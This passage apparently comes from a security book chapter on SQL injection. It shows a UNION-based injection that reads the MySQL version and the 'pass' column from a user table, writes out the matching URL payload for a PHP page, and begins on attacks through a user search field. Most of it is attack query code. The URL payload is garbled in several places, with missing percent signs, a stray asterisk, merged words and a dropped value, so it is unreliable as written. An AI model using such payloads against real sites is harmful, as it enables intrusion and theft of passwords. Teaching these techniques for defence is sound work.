# Listing II.4.10. Determining the MySQL server version

```
SELECT * FROM userslist WHERE id_user = 1
UNION
SELECT id_user, VERSION(), pass, email, url FROM userslist
WHERE id_user = 2
ORDER BY id_user DESC
```

The URL query performing this SQL injection may look like the following:
user.php?id_user=1%20UNION%20SELECT%20id_user,%20VERSION(),%20pass,
20email,%20url*20FROMuserslist%20WHERE%20id_user=
%20%20ORDER%20BY%20id_user%20DESC

The results of this SQL injection are shown in Fig. II.4.6: The MySQL server version is 4.0.24.

![](bbox=[0.15375, 0.44625, 0.9465, 0.64375])

Fig. II.4.6. Determining the MySQL server version

# II.4.4. User Search and SQL Injections

As in the previous example, the UNION construction can be used to compromise the search system. An SQL query for a blank name field (i.e., to select all users) can be constructed as shown in Listing II.4.11.

# Listing II.4.11. Selecting all registered users

```
SELECT * FROM userslist
WHERE name LIKE '%%'
ORDER BY name
```